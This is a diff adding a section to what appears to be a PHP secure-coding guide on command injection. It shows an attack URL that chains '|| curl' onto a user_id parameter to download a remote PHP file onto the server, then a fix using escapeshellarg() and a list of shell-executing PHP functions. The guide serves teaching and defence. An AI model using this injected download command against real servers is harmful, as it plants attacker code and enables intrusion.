@@ -240,3 +240,29 @@ if (!file_exists($path)){
 ?>
 ```
 ####Attack
+- Pass arguments with || or && then system commands
+	- http://localhost/command/upload_picture.php?user_id=1 || curl -K https://raw.githubusercontent.com/vinothzomato/zpwned/master/lfd/download_invoice.php -o test.php
+
+####How to fix
+- Use escapeshellarg() and escapeshellcmd()
+
+upload_picture_fixed.php
+```php
+<?php
+$user_id = $_GET['user_id'];
+$path = dirname(__FILE__).'/'.$user_id;
+if (!file_exists($path)){
+	system('mkdir '.escapeshellarg($path));
+}
+// upload picture
+?>
+```
+####Affected PHP Functions
+- exec
+- passthru
+- system
+- shell_exec
+- `` (backticks)
+- popen
+- proc_open
+- pcntl_exec
